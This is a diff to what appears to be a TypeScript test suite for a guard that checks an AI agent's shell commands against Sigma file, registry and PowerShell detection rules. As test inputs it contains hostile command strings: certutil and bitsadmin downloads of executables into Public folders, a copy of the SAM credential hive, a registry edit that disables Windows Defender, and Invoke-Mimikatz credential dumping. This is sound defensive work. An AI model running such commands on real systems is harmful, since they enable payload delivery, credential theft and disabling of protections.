@@ -8,6 +8,7 @@ import { evaluatePreToolUse } from '../hook/pretool.js';
 import { scriptEventsOf, windowsEventsOf } from '../rulesets/command-gate.js';
 import { convertSigma } from '../rulesets/convert-sigma.js';
 import { loadRuleset } from '../rulesets/loader.js';
+import { fileEventsOf, fileWriteEventOf } from '../rulesets/file-events.js';
 import { normalizeKey, registryEventsOf } from '../rulesets/registry-events.js';
 import { compileCommandRule, ruleMatches } from '../rulesets/sigma.js';
 
@@ -19,6 +20,7 @@ const vendoredWin = path.join(repo, 'rulesets', 'sigma-windows');
 const vendoredLinux = path.join(repo, 'rulesets', 'sigma');
 const vendoredPs = path.join(repo, 'rulesets', 'sigma-powershell');
 const vendoredReg = path.join(repo, 'rulesets', 'sigma-registry');
+const vendoredFile = path.join(repo, 'rulesets', 'sigma-file');
 
 let root: string;
 before(async () => {
@@ -359,6 +361,86 @@ test('registry commands: attack-like ones match the rule that describes them, or
   }
 });
 
+// ---- file
+
+const FILE = (detection: string, category = 'file_event'): string => SAMPLE(detection).replace('category: process_creation', `category: ${category}`);
+const fileMeta = { name: 'sigma-file', version: 'v1', repoUrl: 'https://example.test/blob/v1', platform: 'windows' as const, category: 'file' as const };
+
+test('a file rule is converted for the fields of a file event; it remembers which kind of event it is about', () => {
+  const files = {
+    'rules/create.yml': FILE("selection:\n    TargetFilename|endswith: '.exe'\n    Image|endswith: '\\\\cmd.exe'\ncondition: selection"),
+    'rules/del.yml': FILE("selection:\n    TargetFilename|contains: 'Prefetch'\ncondition: selection", 'file_delete'),
+    'rules/user.yml': FILE("selection:\n    TargetFilename|endswith: '.exe'\n    User: 'SYSTEM'\ncondition: selection"),
+    'rules/proc.yml': SAMPLE("selection:\n    Image|endswith: '\\\\cmd.exe'\ncondition: selection").replace('product: linux', 'product: windows'),
+  };
+  const { ruleset, report } = convertSigma(files, fileMeta);
+  assert.equal(ruleset.category, 'file');
+  assert.deepEqual(ruleset.rules.map((r) => r.on), ['file_event', 'file_delete']);
+  assert.match(report.skipped.find((s) => s.id.includes('user'))?.reason ?? '', /needs User/);
+  assert.match(report.skipped.find((s) => s.id.includes('proc'))?.reason ?? '', /not a Windows file rule/);
+  const [create, del] = ruleset.rules.map(compileCommandRule);
+  const e = { LogsourceCategory: 'file_event', TargetFilename: 'C:\\Users\\Public\\a.exe', Image: 'C:\\Windows\\System32\\cmd.exe' };
+  assert.equal(ruleMatches(create, e), true);
+  assert.equal(ruleMatches(create, { ...e, LogsourceCategory: 'file_delete' }), false, 'a creation rule is not about deletes');
+  assert.equal(ruleMatches(del, { LogsourceCategory: 'file_event', TargetFilename: 'C:\\Windows\\Prefetch\\a.pf' }), false);
+  assert.equal(ruleMatches(del, { LogsourceCategory: 'file_delete', TargetFilename: 'C:\\Windows\\Prefetch\\a.pf' }), true);
+});
+
+test('the file events of a call: redirections, writing and deleting commands, downloads; paths as the rules write them', () => {
+  const cwd = 'C:\\Work\\proj';
+  const one = (command: string) => fileEventsOf(command, cwd).map((e) => [e.LogsourceCategory, e.TargetFilename, e.Image]);
+  assert.deepEqual(one('echo x > out.txt'), [['file_event', 'C:\\Work\\proj\\out.txt', 'C:\\Windows\\System32\\cmd.exe']]);
+  assert.deepEqual(one('echo x >> C:/Users/Public/a.exe').map((e) => e[1]), ['C:\\Users\\Public\\a.exe']);
+  assert.deepEqual(one('echo x > %TEMP%\\a.txt').map((e) => e[1]), ['C:\\Users\\user\\AppData\\Local\\Temp\\a.txt'], 'the profile is a stand-in');
+  assert.deepEqual(one('Out-File -FilePath $env:APPDATA\\x.log').map((e) => e[1]), ['C:\\Users\\user\\AppData\\Roaming\\x.log']);
+  assert.deepEqual(one('Set-Content a.txt -Value hi').map((e) => e[1]), ['C:\\Work\\proj\\a.txt']);
+  assert.deepEqual(one('Copy-Item a.txt -Destination D:\\b.txt').map((e) => e[1]), ['D:\\b.txt']);
+  assert.deepEqual(one('copy a.txt b.txt').map((e) => e[1]), ['C:\\Work\\proj\\b.txt'], 'the destination, not the source');
+  assert.deepEqual(one('certutil -urlcache -f http://x.test/a.exe C:\\Users\\Public\\a.exe').map((e) => [e[1], e[2]]), [['C:\\Users\\Public\\a.exe', 'C:\\Windows\\System32\\certutil.exe']]);
+  assert.deepEqual(one('curl http://x.test/a -o out.bin').map((e) => e[1]), ['C:\\Work\\proj\\out.bin']);
+  assert.deepEqual(one('curl http://x.test/a'), [], 'a download that is not saved writes nothing');
+  assert.deepEqual(one('Invoke-WebRequest http://x.test/a -OutFile a.zip').map((e) => e[1]), ['C:\\Work\\proj\\a.zip']);
+  assert.deepEqual(one('bitsadmin /transfer j http://x.test/a C:\\t\\a.exe').map((e) => e[1]), ['C:\\t\\a.exe']);
+  assert.deepEqual(one('del old.js').map((e) => [e[0], e[1]]), [['file_delete', 'C:\\Work\\proj\\old.js']]);
+  assert.deepEqual(one('Remove-Item -Recurse -Force dist').map((e) => e[0]), ['file_delete']);
+  assert.deepEqual(one('cmd /c "echo x > a.txt"').map((e) => e[1]), ['C:\\Work\\proj\\a.txt'], 'what cmd /c runs is read once');
+  assert.deepEqual(one('git status'), []);
+  assert.deepEqual(one('echo x > NUL'), [], 'the null device is no file');
+  assert.deepEqual(fileWriteEventOf('src\\a.ts', cwd), [{ TargetFilename: 'C:\\Work\\proj\\src\\a.ts', LogsourceCategory: 'file_event' }], 'the Write tool has no Image');
+  assert.ok(fileEventsOf('echo x > a;'.repeat(500), cwd).length <= 100, 'bounded');
+});
+
+test('the vendored file set loads: the same archive, 91 files, 86 rules, written for file events', async () => {
+  const set = await loadRuleset(vendoredFile);
+  const win = await loadRuleset(vendoredWin);
+  assert.equal(set.category, 'file');
+  assert.equal(set.platform, 'windows');
+  assert.equal(set.name, 'sigma-file');
+  assert.equal(set.provenance.archive?.digest, win.provenance.archive?.digest);
+  assert.equal(set.provenance.sources?.length, 91);
+  assert.equal(set.commands.length, 86);
+  assert.equal(set.provenance.report.skipped.length, 5);
+  assert.ok(set.commands.every((r) => r.author && r.title && ['file_event', 'file_delete', 'file_change'].includes(r.on ?? '')));
+});
+
+test('file events: attack-like ones match the rule that describes them, ordinary ones none; the Write tool is judged by its path', async () => {
+  const set = await loadRuleset(vendoredFile);
+  const cwd = 'C:\\Ai\\colony-core';
+  const titles = (command: string) => set.commands.filter((r) => fileEventsOf(command, cwd).some((e) => ruleMatches(r, e))).map((r) => r.title);
+  assert.ok(titles('echo x > C:\\Users\\Public\\a.exe').includes('Windows Shell/Scripting Application File Write to Suspicious Folder'));
+  assert.ok(titles('certutil -urlcache -f http://1.2.3.4/a.exe C:\\Users\\Public\\a.exe').includes('Windows Shell/Scripting Application File Write to Suspicious Folder'));
+  assert.ok(titles('Copy-Item C:\\Windows\\System32\\config\\SAM $env:TEMP\\sam').includes('Potential SAM Database Dump'));
+  for (const ordinary of ['git status', 'pnpm build > build.log 2>&1', 'echo hello > out.txt', 'Set-Content -Path src\\a.ts -Value $x', 'copy a.txt b.txt', 'xcopy src dist /s /y', 'del dist\\old.js', 'Remove-Item -Recurse -Force node_modules', 'curl -o a.zip https://example.com/a.zip', 'echo x > %TEMP%\\scratch.txt']) {
+    assert.deepEqual(titles(ordinary), [], ordinary);
+  }
+  for (const p of ['src/a.ts', 'docs/a.md', '.github/workflows/ci.yml', 'package.json', 'a.ps1', 'run.bat', 'tools\\x.dll']) {
+    assert.deepEqual(set.commands.filter((r) => fileWriteEventOf(p, cwd).some((e) => ruleMatches(r, e))).map((r) => r.title), [], p);
+  }
+  const t0 = Date.now();
+  for (const text of ['copy ' + 'a'.repeat(50000) + ' b', 'echo x > a\\b;'.repeat(1000), 'Out-File ' + 'C:\\x\\'.repeat(5000)]) for (const r of set.commands) fileEventsOf(text, cwd).some((e) => ruleMatches(r, e));
+  assert.ok(Date.now() - t0 < 5000, 'hostile input is bounded');
+});
+
 test('attack-like Windows commands match the rule that describes them; ordinary development commands match none; hostile input is bounded', async () => {
   const set = await loadRuleset(vendoredWin);
   const titles = (command: string) => set.commands.filter((r) => windowsEventsOf(command, 'C:\\work', 'PowerShell').some((e) => ruleMatches(r, e))).map((r) => r.title);
@@ -391,6 +473,10 @@ test('in the guard a PowerShell command that matches a Windows rule is a warning
   assert.deepEqual(plain.notes, []);
   const registry = await evaluatePreToolUse({ tool_name: 'Bash', tool_input: { command: 'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f' } }, dir);
   assert.match(registry.notes.join('\n'), /"Disable Windows Defender Functionalities Via Registry Keys" \(author: /);
+  const file = await evaluatePreToolUse({ tool_name: 'Bash', tool_input: { command: 'echo x > C:\\Users\\Public\\a.exe' } }, dir);
+  assert.match(file.notes.join('\n'), /"Windows Shell\/Scripting Application File Write to Suspicious Folder" \(author: /);
+  const write = await evaluatePreToolUse({ tool_name: 'Write', tool_input: { file_path: path.join(dir, 'src', 'a.ts'), content: 'x' } }, dir);
+  assert.equal(write.notes.filter((n) => /sigma-file/.test(n)).length, 0, 'an ordinary file the Write tool makes is no warning');
   const script = await evaluatePreToolUse({ tool_name: 'PowerShell', tool_input: { command: 'Invoke-Mimikatz -DumpCreds' } }, dir);
   assert.match(script.notes.join('\n'), /sigma-powershell r2026-07-01 rule/);
   assert.match(script.notes.join('\n'), /"Malicious PowerShell Commandlets - ScriptBlock" \(author: /);
